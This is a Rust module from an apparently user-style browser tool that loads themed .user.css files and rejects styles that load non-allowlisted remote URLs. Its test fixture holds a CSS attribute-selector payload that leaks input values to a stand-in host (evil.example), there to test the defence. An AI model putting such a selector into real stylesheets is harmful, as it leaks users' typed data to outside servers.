//! Loading the owned directory (SPEC §5) into a [`Bundle`].
//!
//! Layout:
//!
//! ```text
//! atelier.toml                          theme = "<active theme>"
//! themes/<theme>/global/*.user.css      theme-wide styles, applied to every site
//! services/<service>/service.toml       optional; see ServiceConfig
//! services/<service>/<theme>/*.user.css the service's styles for that theme
//! ```
//!
//! Loading never fails as a whole: problems become diagnostics, and a style
//! with errors is left out of the bundle while the rest still load.

use crate::usercss::{self, UserStyle};
use atelier_proto::{
    Bundle, CompiledSection, CompiledStyle, Diagnostic, Matcher, Prerequisite, Severity,
};
use serde::Deserialize;
use std::collections::{BTreeMap, BTreeSet};
use std::fs;
use std::path::Path;

/// Hosts that styles may load resources from (SPEC §12). Anything else remote
/// in `url()` or `@import` could leak page content, so it's an error.
const REMOTE_ALLOWLIST: &[&str] = &["fonts.googleapis.com", "fonts.gstatic.com"];

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct DirConfig {
    theme: Option<String>,
}
const DIR_CONFIG_KEYS: &[&str] = &["theme"];

/// `services/<service>/service.toml`. Everything is optional, and problems in
/// it are warnings: a typo shouldn't stop a service's styles from loading.
#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct ServiceConfig {
    /// The user's own description of what they wanted styled.
    #[allow(dead_code)]
    description: Option<String>,
    /// The agent's summary of what the service covers.
    #[allow(dead_code)]
    summary: Option<String>,
    /// Things the user has to set on the site for the styles to work, e.g.
    /// "set Appearance to 'sync with system'".
    prerequisites: Vec<PrerequisiteConfig>,
    /// Keep Dark Reader off pages these styles apply to (SPEC §6.5). Default true.
    dark_reader_lock: Option<bool>,
    /// Representative pages and states of the site, for checking styles
    /// against (SPEC §5.2). Read by briefs; checked here only for shape.
    pages: Vec<PageConfig>,
}

/// One representative page: where it is, what it shows, and the states
/// worth looking at on it (a menu open, a focused input, logged in).
/// All optional, so a sloppy entry can't cost the service its settings.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default)]
#[allow(dead_code)]
struct PageConfig {
    url: Option<String>,
    what: Option<String>,
    states: Vec<String>,
}
/// A prerequisite: just a description, or a table with an optional check.
#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
enum PrerequisiteConfig {
    Text(String),
    Checked {
        description: String,
        check: Option<String>,
    },
}

impl From<&PrerequisiteConfig> for Prerequisite {
    fn from(p: &PrerequisiteConfig) -> Self {
        match p {
            PrerequisiteConfig::Text(description) => Prerequisite {
                description: description.clone(),
                check: None,
            },
            PrerequisiteConfig::Checked { description, check } => Prerequisite {
                description: description.clone(),
                check: check.clone(),
            },
        }
    }
}

const SERVICE_CONFIG_KEYS: &[&str] = &[
    "description",
    "summary",
    "prerequisites",
    "dark_reader_lock",
    "pages",
];

pub fn load(dir: &Path, vars: &BTreeMap<String, String>) -> Bundle {
    let mut l = Loader {
        dir,
        vars,
        bundle: Bundle::default(),
    };
    l.load();
    l.bundle
}

struct Loader<'a> {
    dir: &'a Path,
    vars: &'a BTreeMap<String, String>,
    bundle: Bundle,
}

impl Loader<'_> {
    fn diag(
        &mut self,
        severity: Severity,
        path: Option<&str>,
        line: Option<usize>,
        message: impl Into<String>,
    ) {
        self.bundle.diagnostics.push(Diagnostic {
            severity,
            path: path.map(str::to_string),
            line: line.map(|l| l as u32),
            message: message.into(),
        });
    }

    fn load(&mut self) {
        let config: DirConfig = match fs::read_to_string(self.dir.join("atelier.toml")) {
            Ok(text) => {
                match self.parse_config(&text, "atelier.toml", DIR_CONFIG_KEYS, Severity::Error) {
                    Some(c) => c,
                    None => return,
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                self.diag(
                    Severity::Warning,
                    Some("atelier.toml"),
                    None,
                    "missing, so no theme is active and nothing is styled",
                );
                return;
            }
            Err(e) => {
                self.diag(Severity::Error, Some("atelier.toml"), None, e.to_string());
                return;
            }
        };
        let Some(theme) = config.theme else {
            self.diag(
                Severity::Warning,
                Some("atelier.toml"),
                None,
                "no `theme` set, so nothing is styled",
            );
            return;
        };
        self.bundle.theme = Some(theme.clone());
        if !self.dir.join("themes").join(&theme).is_dir() {
            self.diag(
                Severity::Warning,
                Some("atelier.toml"),
                None,
                format!("theme `{theme}` has no directory under themes/"),
            );
        }

        for file in style_files(&self.dir.join("themes").join(&theme).join("global")) {
            let id = format!("themes/{theme}/global/{file}");
            self.load_style(&id, None, false, &[]);
        }

        for service in subdirs(&self.dir.join("services")) {
            let config_path = format!("services/{service}/service.toml");
            let config: ServiceConfig = match fs::read_to_string(self.dir.join(&config_path)) {
                Ok(text) => self
                    .parse_config(&text, &config_path, SERVICE_CONFIG_KEYS, Severity::Warning)
                    .unwrap_or_default(),
                Err(_) => ServiceConfig::default(),
            };
            let lock = config.dark_reader_lock.unwrap_or(true);
            let prerequisites: Vec<Prerequisite> = config
                .prerequisites
                .iter()
                .map(Prerequisite::from)
                .collect();
            let styles_dir = self.dir.join("services").join(&service).join(&theme);
            for file in files_with_suffix(&styles_dir, ".user.js") {
                self.diag(
                    Severity::Warning,
                    Some(&format!("services/{service}/{theme}/{file}")),
                    None,
                    "userscripts aren't supported yet (SPEC §15, phase 5), so this file is ignored",
                );
            }
            for file in style_files(&styles_dir) {
                let id = format!("services/{service}/{theme}/{file}");
                self.load_style(&id, Some(&service), lock, &prerequisites);
            }
        }
    }

    /// Parses a TOML config file. Unknown keys are warnings and ignored. Other
    /// problems are reported at `severity` and give `None`.
    fn parse_config<T: serde::de::DeserializeOwned>(
        &mut self,
        text: &str,
        path: &str,
        known: &[&str],
        severity: Severity,
    ) -> Option<T> {
        let mut table: toml::Table = match toml::from_str(text) {
            Ok(t) => t,
            Err(e) => {
                let line = e.span().map(|s| text[..s.start].matches('\n').count() + 1);
                self.diag(severity, Some(path), line, e.message().to_string());
                return None;
            }
        };
        let unknown: Vec<String> = table
            .keys()
            .filter(|k| !known.contains(&k.as_str()))
            .cloned()
            .collect();
        for key in unknown {
            table.remove(&key);
            self.diag(
                Severity::Warning,
                Some(path),
                None,
                format!(
                    "unknown setting `{key}` (known: {}); ignored",
                    known.join(", ")
                ),
            );
        }
        match T::deserialize(toml::Value::Table(table)) {
            Ok(c) => Some(c),
            Err(e) => {
                self.diag(severity, Some(path), None, e.message().to_string());
                None
            }
        }
    }

    fn load_style(
        &mut self,
        id: &str,
        service: Option<&str>,
        dark_reader_lock: bool,
        prerequisites: &[Prerequisite],
    ) {
        let source = match fs::read_to_string(self.dir.join(id)) {
            Ok(s) => s,
            Err(e) => return self.diag(Severity::Error, Some(id), None, e.to_string()),
        };
        let style = match usercss::parse(&source) {
            Ok(s) => s,
            Err(e) => return self.diag(Severity::Error, Some(id), e.line, e.message),
        };

        let mut errors = false;
        for (line, message) in lint_remote_urls(&style, &source)
            .into_iter()
            .chain(lint_matchers(&style, &source))
        {
            self.diag(Severity::Error, Some(id), line, message);
            errors = true;
        }
        if !source.contains("==UserStyle==") {
            self.diag(
                Severity::Warning,
                Some(id),
                None,
                "has no `==UserStyle==` metadata block, so it's named after its file and can't declare @vars",
            );
        }
        if service.is_some() && style.sections.iter().any(|s| s.is_global()) {
            self.diag(
                Severity::Warning,
                Some(id),
                None,
                "has CSS outside any `@-moz-document` block, which applies to every site",
            );
        }
        if errors {
            return;
        }
        self.bundle.styles.push(compile(
            id,
            service,
            dark_reader_lock,
            prerequisites,
            &style,
            self.vars,
        ));
    }
}

fn compile(
    id: &str,
    service: Option<&str>,
    dark_reader_lock: bool,
    prerequisites: &[Prerequisite],
    style: &UserStyle,
    vars: &BTreeMap<String, String>,
) -> CompiledStyle {
    let vars_css = if style.meta.vars.is_empty() {
        String::new()
    } else {
        let decls: Vec<String> = style
            .meta
            .vars
            .iter()
            .map(|v| format!("--{}: {};", v.name, vars.get(&v.name).unwrap_or(&v.default)))
            .collect();
        format!(":root {{ {} }}", decls.join(" "))
    };
    let sections: Vec<CompiledSection> = style
        .sections
        .iter()
        .map(|s| CompiledSection {
            matchers: s.matchers.iter().map(to_proto).collect(),
            css: s.css.clone(),
            shadow: s
                .shadow
                .iter()
                .map(|b| atelier_proto::ShadowCss {
                    host: b.host.clone(),
                    css: b.css.clone(),
                })
                .collect(),
        })
        .collect();
    let name = style.meta.name.clone().unwrap_or_else(|| {
        id.rsplit('/')
            .next()
            .unwrap_or(id)
            .trim_end_matches(".user.css")
            .to_string()
    });
    CompiledStyle {
        id: id.to_string(),
        service: service.map(str::to_string),
        name,
        vars_css,
        patterns: patterns(&style.sections),
        sections,
        prerequisites: prerequisites.to_vec(),
        dark_reader_lock,
    }
}

fn to_proto(m: &usercss::Matcher) -> Matcher {
    match m {
        usercss::Matcher::Url(v) => Matcher::Url(v.clone()),
        usercss::Matcher::UrlPrefix(v) => Matcher::UrlPrefix(v.clone()),
        usercss::Matcher::Domain(v) => Matcher::Domain(v.clone()),
        usercss::Matcher::Regexp(v) => Matcher::Regexp(v.clone()),
    }
}

/// WebExtension match patterns covering every section. Over-approximating is
/// fine (the extension checks matchers precisely); missing a URL is not.
fn patterns(sections: &[usercss::Section]) -> Vec<String> {
    const ALL: &str = "<all_urls>";
    let mut out = BTreeSet::new();
    for section in sections {
        if section.is_global() {
            return vec![ALL.into()];
        }
        for m in &section.matchers {
            match m {
                usercss::Matcher::Domain(d) => {
                    out.insert(format!("*://{d}/*"));
                    out.insert(format!("*://*.{d}/*"));
                }
                usercss::Matcher::Url(u) | usercss::Matcher::UrlPrefix(u) => {
                    match prefix_pattern(u) {
                        Some(p) => {
                            out.insert(p);
                        }
                        None => return vec![ALL.into()],
                    }
                }
                usercss::Matcher::Regexp(_) => return vec![ALL.into()],
            }
        }
    }
    out.into_iter().collect()
}

/// A match pattern covering every URL that starts with `prefix`, when the
/// prefix includes a full http(s) host. Ports are dropped: match patterns
/// can't express them and match any port.
fn prefix_pattern(prefix: &str) -> Option<String> {
    let (scheme, rest) = prefix.split_once("://")?;
    if scheme != "http" && scheme != "https" {
        return None;
    }
    let slash = rest.find('/')?; // without a path, the host itself might be a prefix of another host
    let host = rest[..slash].split(':').next()?;
    if host.is_empty() || host.contains('*') {
        return None;
    }
    let path = rest[slash..].split(['?', '#']).next().unwrap_or("/");
    Some(format!("{scheme}://{host}{}*", path.replace('*', "")))
}

/// Remote URLs that aren't on the allowlist, in `url()` and `@import` in the
/// style's CSS. Matchers in `@-moz-document` preludes and comments aren't
/// loads, so only parsed section CSS is scanned, with comments removed.
fn lint_remote_urls(style: &UserStyle, source: &str) -> Vec<(Option<usize>, String)> {
    let mut seen = BTreeSet::new();
    style
        .sections
        .iter()
        .flat_map(|s| {
            std::iter::once(s.css.as_str())
                .chain(s.shadow.iter().map(|b| b.css.as_str()))
                .flat_map(remote_urls_in)
                .collect::<Vec<_>>()
        })
        .filter(|url| seen.insert(url.clone()))
        .map(|url| {
            (
                line_of(source, &url),
                format!(
                    "loads `{url}` from a remote host, which could leak page content; styles may only load remote resources from {}",
                    REMOTE_ALLOWLIST.join(", ")
                ),
            )
        })
        .collect()
}

/// Remote, non-allowlisted URLs loaded by `css` (one section's CSS).
fn remote_urls_in(css: &str) -> Vec<String> {
    let comments = regex::Regex::new(r"(?s)/\*.*?\*/").expect("static regex");
    let css = comments.replace_all(css, "");
    let re =
        regex::Regex::new(r#"(?i)(?:url\(\s*['"]?|@import\s+['"])\s*((?:https?:)?//[^'")\s]+)"#)
            .expect("static regex");
    re.captures_iter(&css)
        .filter_map(|c| {
            let url = c.get(1)?.as_str();
            let host = url
                .split("//")
                .nth(1)?
                .split(['/', ':', '?', '#'])
                .next()?
                .to_ascii_lowercase();
            (!REMOTE_ALLOWLIST.contains(&host.as_str())).then(|| url.to_string())
        })
        .collect()
}

/// Matchers that can't work: `domain()` given something other than a host,
/// and `regexp()` patterns JavaScript can't compile.
fn lint_matchers(style: &UserStyle, source: &str) -> Vec<(Option<usize>, String)> {
    let mut out = Vec::new();
    for m in style.sections.iter().flat_map(|s| &s.matchers) {
        match m {
            usercss::Matcher::Domain(d) if d.is_empty() || d.contains(['/', ':', '*', ' ']) => out.push((
                line_of_matcher(source, "domain", d),
                format!("`domain(\"{d}\")` takes a host name such as \"example.com\", without a scheme, port, path or wildcard"),
            )),
            usercss::Matcher::Regexp(r) => {
                if let Err(e) = regress::Regex::new(r) {
                    out.push((
                        line_of_matcher(source, "regexp", r),
                        format!("`regexp()` pattern isn't a valid JavaScript regular expression: {e}"),
                    ));
                }
            }
            _ => {}
        }
    }
    out
}

/// 1-based line of the `func(...)` matcher whose argument starts with `value`
/// (quoted or not), falling back to the first `func(`.
fn line_of_matcher(source: &str, func: &str, value: &str) -> Option<usize> {
    let call = format!("{func}(");
    let starts = || source.match_indices(&call).map(|(i, _)| i);
    let found = starts()
        .find(|&i| {
            let arg = source[i + call.len()..].trim_start();
            let arg = arg.strip_prefix(['"', '\'']).unwrap_or(arg);
            arg.starts_with(value)
        })
        .or_else(|| starts().next())?;
    Some(source[..found].matches('\n').count() + 1)
}

/// 1-based line of the first occurrence of `needle` in `source`.
fn line_of(source: &str, needle: &str) -> Option<usize> {
    source
        .find(needle)
        .map(|i| source[..i].matches('\n').count() + 1)
}

fn subdirs(dir: &Path) -> Vec<String> {
    let mut names: Vec<String> = fs::read_dir(dir)
        .into_iter()
        .flatten()
        .flatten()
        .filter(|e| e.file_type().is_ok_and(|t| t.is_dir()))
        .filter_map(|e| e.file_name().into_string().ok())
        .filter(|n| !n.starts_with('.'))
        .collect();
    names.sort();
    names
}

fn style_files(dir: &Path) -> Vec<String> {
    files_with_suffix(dir, ".user.css")
}

fn files_with_suffix(dir: &Path, suffix: &str) -> Vec<String> {
    let mut names: Vec<String> = fs::read_dir(dir)
        .into_iter()
        .flatten()
        .flatten()
        .filter(|e| e.file_type().is_ok_and(|t| t.is_file()))
        .filter_map(|e| e.file_name().into_string().ok())
        .filter(|n| n.ends_with(suffix) && !n.starts_with('.'))
        .collect();
    names.sort();
    names
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write(root: &Path, path: &str, content: &str) {
        let p = root.join(path);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, content).unwrap();
    }

    fn fixture() -> tempfile::TempDir {
        let d = tempfile::tempdir().unwrap();
        let root = d.path();
        write(root, "atelier.toml", "theme = \"dusk\"\n");
        write(root, "themes/dusk/THEME.md", "# Dusk\n");
        write(
            root,
            "themes/dusk/global/scrollbars.user.css",
            "* { scrollbar-width: thin; }\n",
        );
        write(
            root,
            "services/github/github.toml.bak",
            "not a service config; ignored because of its name",
        );
        write(
            root,
            "services/github/service.toml",
            "description = \"GitHub\"\n",
        );
        write(
            root,
            "services/github/dusk/base.user.css",
            "/* ==UserStyle==\n@name GitHub base\n@var color accent \"Accent\" #f80\n==/UserStyle== */\n\
             @-moz-document domain(\"github.com\") { body { color: var(--accent); } }\n",
        );
        write(
            root,
            "services/github/light/base.user.css",
            "@-moz-document domain(\"github.com\") { body { color: black; } }\n",
        );
        write(
            root,
            "services/wiki/service.toml",
            "dark_reader_lock = false\n",
        );
        write(
            root,
            "services/wiki/dusk/base.user.css",
            "@-moz-document url-prefix(\"https://en.wikipedia.org:443/wiki/\") { body { color: grey; } }\n",
        );
        write(
            root,
            "services/leaky/dusk/base.user.css",
            "@-moz-document domain(\"leaky.example\") { input[value^=\"a\"] { background: url(https://evil.example/a); } }\n",
        );
        d
    }

    #[test]
    fn loads_active_theme_only() {
        let d = fixture();
        let bundle = load(d.path(), &BTreeMap::new());
        assert_eq!(bundle.theme.as_deref(), Some("dusk"));
        let ids: Vec<_> = bundle.styles.iter().map(|s| s.id.as_str()).collect();
        assert_eq!(
            ids,
            [
                "themes/dusk/global/scrollbars.user.css",
                "services/github/dusk/base.user.css",
                "services/wiki/dusk/base.user.css"
            ]
        );
    }

    #[test]
    fn compiles_styles() {
        let d = fixture();
        let vars = BTreeMap::from([("accent".to_string(), "#123456".to_string())]);
        let bundle = load(d.path(), &vars);

        let global = &bundle.styles[0];
        assert_eq!(global.service, None);
        assert_eq!(global.patterns, ["<all_urls>"]);
        assert!(!global.dark_reader_lock);
        assert_eq!(global.name, "scrollbars");

        let github = &bundle.styles[1];
        assert_eq!(github.name, "GitHub base");
        assert_eq!(github.service.as_deref(), Some("github"));
        assert_eq!(github.vars_css, ":root { --accent: #123456; }");
        assert_eq!(github.patterns, ["*://*.github.com/*", "*://github.com/*"]);
        assert!(github.dark_reader_lock);
        assert_eq!(
            github.sections[0].matchers,
            [Matcher::Domain("github.com".into())]
        );

        let wiki = &bundle.styles[2];
        assert_eq!(wiki.patterns, ["https://en.wikipedia.org/wiki/*"]);
        assert!(!wiki.dark_reader_lock);
    }

    #[test]
    fn vars_fall_back_to_defaults() {
        let d = fixture();
        let bundle = load(d.path(), &BTreeMap::new());
        assert_eq!(bundle.styles[1].vars_css, ":root { --accent: #f80; }");
    }

    #[test]
    fn remote_urls_are_errors_and_exclude_the_style() {
        let d = fixture();
        let bundle = load(d.path(), &BTreeMap::new());
        assert!(!bundle.styles.iter().any(|s| s.id.contains("leaky")));
        let diag = bundle
            .diagnostics
            .iter()
            .find(|d| d.path.as_deref() == Some("services/leaky/dusk/base.user.css"))
            .expect("diagnostic for the leaky style");
        assert_eq!(diag.severity, Severity::Error);
        assert_eq!(diag.line, Some(1));
        assert!(diag.message.contains("https://evil.example/a"));
    }

    #[test]
    fn allowlisted_and_relative_urls_are_fine() {
        let css = "@import url(\"https://fonts.googleapis.com/css2?family=Inter\");\n\
                   a { background: url(/local.png); } b { background: url(data:image/png;base64,AA==); }";
        assert!(remote_urls_in(css).is_empty());
        assert_eq!(remote_urls_in("@import \"//evil.example/x.css\";").len(), 1);
    }

    #[test]
    fn matcher_urls_and_comments_are_not_loads() {
        let source = "/* see https://evil.example/notes and url(https://evil.example/x) */\n\
                      @-moz-document url(\"https://h.example/page\"), url-prefix(\"https://h.example/\") {\n\
                        a { color: red; } /* background: url(https://evil.example/y) */\n\
                      }\n";
        let style = usercss::parse(source).unwrap();
        assert!(lint_remote_urls(&style, source).is_empty());
    }

    #[test]
    fn representative_pages_are_known_and_forgiving() {
        let d = fixture();
        write(
            d.path(),
            "services/github/service.toml",
            "[[pages]]\nurl = \"https://github.com/rust-lang/rust\"\nwhat = \"repo home\"\nstates = [\"Code menu open\"]\n\n[[pages]]\nwhat = \"no url yet\"\n",
        );
        let bundle = load(d.path(), &BTreeMap::new());
        assert!(
            !bundle
                .diagnostics
                .iter()
                .any(|d| d.path.as_deref() == Some("services/github/service.toml")),
            "{:?}",
            bundle.diagnostics
        );
    }

    #[test]
    fn unknown_service_settings_warn_but_styles_still_load() {
        let d = fixture();
        write(
            d.path(),
            "services/github/service.toml",
            "descripton = \"typo\"\n",
        );
        let bundle = load(d.path(), &BTreeMap::new());
        assert!(
            bundle
                .styles
                .iter()
                .any(|s| s.service.as_deref() == Some("github"))
        );
        let diag = bundle
            .diagnostics
            .iter()
            .find(|d| d.path.as_deref() == Some("services/github/service.toml"))
            .unwrap();
        assert_eq!(diag.severity, Severity::Warning);
        assert!(diag.message.contains("descripton"));
    }

    #[test]
    fn bad_matchers_are_errors() {
        let source = "@-moz-document domain(\"https://d.example/\") { a {} }\n@-moz-document regexp(\"(\") { b {} }\n";
        let style = usercss::parse(source).unwrap();
        let errors = lint_matchers(&style, source);
        assert_eq!(errors.len(), 2);
        assert_eq!(errors[0].0, Some(1));
        assert_eq!(errors[1].0, Some(2));
        // Lookahead is fine in JavaScript, so it's fine here too.
        let ok = usercss::parse("@-moz-document regexp(\"https://f\\\\.com/(?!x).*\") { a {} }")
            .unwrap();
        assert!(lint_matchers(&ok, "").is_empty());
    }

    #[test]
    fn userscripts_and_missing_metadata_warn() {
        let d = fixture();
        write(
            d.path(),
            "services/github/dusk/fix.user.js",
            "// ==UserScript==\n",
        );
        let bundle = load(d.path(), &BTreeMap::new());
        let warnings: Vec<_> = bundle
            .diagnostics
            .iter()
            .filter(|d| d.severity == Severity::Warning)
            .map(|d| (d.path.clone().unwrap_or_default(), d.message.clone()))
            .collect();
        assert!(
            warnings
                .iter()
                .any(|(p, m)| p.ends_with("fix.user.js") && m.contains("ignored"))
        );
        assert!(
            warnings
                .iter()
                .any(|(p, m)| p.ends_with("wiki/dusk/base.user.css") && m.contains("metadata"))
        );
    }

    #[test]
    fn missing_config_is_a_warning() {
        let d = tempfile::tempdir().unwrap();
        let bundle = load(d.path(), &BTreeMap::new());
        assert!(bundle.styles.is_empty());
        assert_eq!(bundle.diagnostics[0].severity, Severity::Warning);
    }

    #[test]
    fn broken_service_config_is_a_warning_and_falls_back_to_defaults() {
        let d = fixture();
        write(
            d.path(),
            "services/github/service.toml",
            "dark_reader_lock = \"yes\"\n",
        );
        let bundle = load(d.path(), &BTreeMap::new());
        let github = bundle
            .styles
            .iter()
            .find(|s| s.service.as_deref() == Some("github"))
            .unwrap();
        assert!(github.dark_reader_lock);
        assert!(bundle.diagnostics.iter().any(|d| d.path.as_deref()
            == Some("services/github/service.toml")
            && d.severity == Severity::Warning));
    }

    #[test]
    fn prerequisites_reach_the_service_styles() {
        let d = fixture();
        write(
            d.path(),
            "services/github/service.toml",
            "prerequisites = [\"plain\", { description = \"checked\", check = \"html.dark\" }]\n",
        );
        let bundle = load(d.path(), &BTreeMap::new());
        let github = bundle
            .styles
            .iter()
            .find(|s| s.service.as_deref() == Some("github"))
            .unwrap();
        assert_eq!(
            github.prerequisites,
            [
                Prerequisite {
                    description: "plain".into(),
                    check: None
                },
                Prerequisite {
                    description: "checked".into(),
                    check: Some("html.dark".into())
                },
            ]
        );
        assert!(
            bundle
                .diagnostics
                .iter()
                .all(|d| d.path.as_deref() != Some("services/github/service.toml"))
        );
    }

    #[test]
    fn prefix_patterns() {
        assert_eq!(
            prefix_pattern("https://a.com/x"),
            Some("https://a.com/x*".into())
        );
        assert_eq!(
            prefix_pattern("http://a.com:8080/"),
            Some("http://a.com/*".into())
        );
        assert_eq!(prefix_pattern("https://a.co"), None);
        assert_eq!(prefix_pattern("file:///home/"), None);
    }
}
